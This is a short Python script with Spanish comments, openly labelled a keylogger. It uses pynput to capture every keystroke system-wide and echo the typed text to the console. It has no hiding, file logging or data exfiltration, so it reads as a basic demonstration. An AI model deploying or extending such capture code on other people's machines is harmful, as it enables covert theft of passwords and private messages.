from pynput import keyboard

# Lista para almacenar el texto capturado
captura_teclas = []
MAX_CARACTERES = 60  # Límite de caracteres por línea

def procesar_tecla(tecla):
    """Procesa cada tecla presionada y la agrega a la lista captura_teclas."""
    try:
        if tecla.char:  # Si es un carácter imprimible
            captura_teclas.append(tecla.char)
            mostrar_texto()  # Muestra el texto actualizado
    except AttributeError:
        manejar_teclas_especiales(tecla)  # Manejo de teclas especiales

def manejar_teclas_especiales(tecla):
    """Maneja las teclas especiales como espacio, enter y backspace."""
    if tecla == keyboard.Key.space:
        captura_teclas.append(' ')
        mostrar_texto()
    elif tecla == keyboard.Key.enter:
        captura_teclas.append('\n')
        mostrar_texto()  # Muestra el salto de línea
    elif tecla == keyboard.Key.backspace and captura_teclas:
        captura_teclas.pop()  # Elimina el último carácter
        mostrar_texto()  # Actualiza la visualización

def mostrar_texto():
    """Muestra el texto capturado en la consola."""
    # Convertir lista a string
    texto = ''.join(captura_teclas)

    # Verificar el tamaño del texto y agregar salto de línea si es necesario
    if len(texto) >= MAX_CARACTERES and not texto.endswith('\n'):
        texto += '\n'  # Añadir salto de línea solo si se supera el límite

    # Imprimir texto completo en un formato rectangular
    print(texto)  # Muestra el texto completo

def iniciar_keylogger():
    """Inicia el listener del teclado para capturar las teclas presionadas."""
    try:
        with keyboard.Listener(on_press=procesar_tecla) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger finalizado.")

if __name__ == "__main__":
    iniciar_keylogger()
